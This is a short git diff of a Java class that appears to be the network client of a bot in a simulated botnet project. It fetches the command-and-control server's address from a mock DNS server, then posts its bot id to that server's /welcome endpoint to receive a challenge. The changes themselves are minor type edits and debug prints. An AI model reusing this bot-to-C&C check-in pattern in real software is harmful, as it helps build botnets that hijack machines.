@@ -93,20 +93,25 @@ public class AsyncRequest {
 	}
 
 	//da valutare se devono essere asincroni
-	public Pairs<IP,PublicKey>  getIpCeCFromDnsServer(String dnsUrl) {
-		Pairs<IP,PublicKey> cec = new Pairs<>();
-		Type type = new TypeToken<Pairs<IP,PublicKey>>() {}.getType();
+	public Pairs<IP,String>  getIpCeCFromDnsServer(String dnsUrl) {
+		Pairs<IP,String> cec = new Pairs<>();
+		Type type = new TypeToken<Pairs<IP,String>>() {}.getType();
 		try {
+			System.out.println("url request "+dnsUrl);
+			String url=HTTP+dnsUrl;
 			cec=doGetJSON(HTTP+dnsUrl,type);
+//			cec=restTemplate.getForEntity
+//			cecBase64.decodeBase64(cec.getValue2());
 			
 		} catch (Exception e) {
-			System.err.println("Errore ricezione Ip da Mock Dns Server");
+			System.err.println("Errore ricezione Ip da Mock Dns Server"+e);
 		}
 		return cec;
 	}
 
 	//da valutare se devono essere asincroni
 	public Pairs<Long,Integer> getChallengeFromCeC(String idBot,IP ipCeC){
+	
 		Pairs<Long,Integer> response = new Pairs<>();
 		Integer counter = 0;
 		while (counter <= REQNUMBER) {
@@ -114,6 +119,7 @@ public class AsyncRequest {
 //		String postRequest = "{\"idBot\":\""+idBot+"\"}";
 		try {
 			String url=HTTPS+ipCeC+PORT+"/welcome";
+			System.out.println("url challenge request "+url);
 			response=restTemplate.postForObject(url, idBot,response.getClass());
 			//System.out.println("Url:"+url);
 			//challenge=doGetJSON(url, type);
